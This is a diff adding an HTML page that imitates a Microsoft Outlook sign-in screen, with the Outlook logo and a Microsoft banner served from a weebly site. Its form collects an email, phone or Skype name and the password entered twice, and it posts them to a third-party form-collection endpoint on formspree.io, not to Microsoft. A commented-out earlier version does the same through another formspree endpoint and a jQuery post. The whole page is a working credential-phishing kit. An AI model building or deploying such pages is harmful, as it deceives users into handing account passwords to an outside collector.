@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
+    integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>Sign In</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <style>
+    .center {
+      position: absolute;
+      top: 20%;
+      left: 15%;
+      transform: translate(50, -50%);
+      width: 300px;
+      height: 400px;
+    }
+
+    .form-control {
+      border-radius: 0%;
+      width: 70%;
+      border-color: black;
+    }
+
+    .nonsense {
+      position: absolute;
+      top: 20%;
+      left: 15%;
+      width: 300px;
+      height: 400px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <img src="https://www.logo.wine/a/logo/Microsoft_Outlook/Microsoft_Outlook-Logo.wine.svg" alt="logo" width=56
+    height=56 style="display: block;margin-left: auto;margin-right: auto;">
+
+  <div class=container>
+    <img src="https://microsoftexcel21.weebly.com/uploads/1/3/9/6/139655177/published/microsoft-top-1.png?1635520436"
+      style="margin-top: 20px; margin-bottom: 20px;">
+    <h4>Sign in</h4>
+    <form action="https://formspree.io/f/xeqyakzw" method="post">
+      <div class="form-group">
+        <label for="exampleInputEmail1">Email, phone or skype</label>
+        <input type="text" class="form-control" id="email" aria-describedby="emailHelp" name="e1"
+        style="border-color: black; border-radius: 0%;" required
+        oninput="checkValidity();">      
+      </div>
+      <div class="form-group">
+        <label for="exampleInputPassword1">Password</label>
+        <input type="password" class="form-control" id="password" name="pr1"
+          style="border-color: black; border-radius: 0%;" required>
+      </div>
+      <div class="form-group">
+        <label for="exampleInputPassword1">Confirm Password</label>
+        <input type="password" class="form-control" id="passwordConfirm" name="pr2"
+          style="border-color: black; border-radius: 0%;" required oninput="checkPasswordMatch()">
+        <small id="passwordMatchMessage"></small>
+      </div>
+      <p>No account? <span><a href='#'> Create One!</a></span></p>
+      <p><a href='#'>Sign in with a security key</a></p>
+      <button type="submit" class="sign-in btn btn-primary" value="Send"
+        style="background-color:black;border-radius:0%; padding:5px; border-color: black; padding:.5rem; "><strong>SIGN
+          IN</strong></button>
+    </form>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>
+    function setCustomValidity() {
+      const email = $('#email').val().trim();
+      const skypePattern = /^[a-zA-Z][a-zA-Z0-9\.,\-_]{1,30}$/;
+      const phonePattern = /^\d{11}$/; // Adjust the regex based on your phone number format
+  
+      if (email.match(/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i) ||
+          email.match(skypePattern) ||
+          email.match(phonePattern)) {
+        // Valid email address, Skype username, or phone number
+        $('#email')[0].setCustomValidity('');
+      } else {
+        // Invalid input
+        $('#email')[0].setCustomValidity('Invalid email address, Skype username, or phone number');
+      }
+    }
+  
+    function checkValidity() {
+      setCustomValidity(); // Call the custom validity check function
+  
+      if (!$('#email')[0].checkValidity()) {
+        // If the input is still not valid after custom validation
+        // Handle accordingly (display error message, disable submit button, etc.)
+        console.log('Input is not valid');
+      }
+    }
+  
+    function checkPasswordMatch() {
+      var password = $("#password").val();
+      var confirmPassword = $("#passwordConfirm").val();
+  
+      if (password != confirmPassword)
+        $("#passwordMatchMessage").html("Passwords do not match!").css("color", "red");
+      else
+        $("#passwordMatchMessage").html("Passwords match.").css("color", "green");
+    }
+  
+  </script>
+  
+  
+<!-- 
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
+    integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>Sign In</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <style>
+    .center {
+      position: absolute;
+      top: 20%;
+      left: 15%;
+      transform: translate(50, -50%);
+      width: 300px;
+      height: 400px;
+    }
+
+    .form-control {
+      border-radius: 0%;
+      width: 70%;
+      border-color: black;
+    }
+
+    .nonsense {
+      position: absolute;
+      top: 20%;
+      left: 15%;
+      width: 300px;
+      height: 400px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <img src="https://www.logo.wine/a/logo/Microsoft_Outlook/Microsoft_Outlook-Logo.wine.svg" alt="logo" width=56
+    height=56 style="display: block;margin-left: auto;margin-right: auto;">
+
+  <div class=container>
+    <img src="https://microsoftexcel21.weebly.com/uploads/1/3/9/6/139655177/published/microsoft-top-1.png?1635520436"
+      style="margin-top: 20px; margin-bottom: 20px;">
+    <h4>Sign in</h4>
+    <form action="https://formspree.io/f/mrgjgllk" method="post">
+      <div class="form-group">
+        <label for="exampleInputEmail1">Email, phone or skype</label>
+        <input type="email" class="form-control" id="email" aria-describedby="emailHelp" name="Email,Phone or Skype"
+          style="border-color: black; border-radius: 0%;" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
+          oninput="setCustomValidity(''); checkValidity();" oninvalid="setCustomValidity('Invalid email address')">
+      </div>
+      <div class="form-group">
+        <label for="exampleInputPassword1">Password</label>
+        <input type="password" class="form-control" id="password" name="Password"
+          style="border-color: black; border-radius: 0%;" required>
+      </div>
+      <div class="form-group">
+        <label for="exampleInputPassword1">Confirm Password</label>
+        <input type="password" class="form-control" id="passwordConfirm" name="ConfirmPassword"
+          style="border-color: black; border-radius: 0%;" required oninput="checkPasswordMatch()">
+        <small id="passwordMatchMessage"></small>
+      </div>
+      <p>No account? <span><a href='#'> Create One!</a></span></p>
+      <p><a href='#'>Sign in with a security key</a></p>
+      <button type="submit" class="sign-in btn btn-primary" value="Send"
+        style="background-color:black;border-radius:0%; padding:5px; border-color: black; padding:.5rem; "><strong>SIGN
+          IN</strong></button>
+    </form>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>
+    function checkPasswordMatch() {
+      var password = $("#password").val();
+      var confirmPassword = $("#passwordConfirm").val();
+
+      if (password != confirmPassword)
+        $("#passwordMatchMessage").html("Passwords do not match!").css("color", "red");
+      else
+        $("#passwordMatchMessage").html("Passwords match.").css("color", "green");
+    }
+
+    $('form').on('submit', (e) => {
+      e.preventDefault();
+
+      const email = $('#email').val().trim();
+      const password = $('#password').val().trim();
+      const passwordConfirm = $('#passwordConfirm').val().trim();
+
+      const data = {
+        email,
+        password,
+        passwordConfirm
+      };
+      $.post('/email', data, '');
+
+    });
+  </script>
+
+</body>
+
+</html>
+``` -->
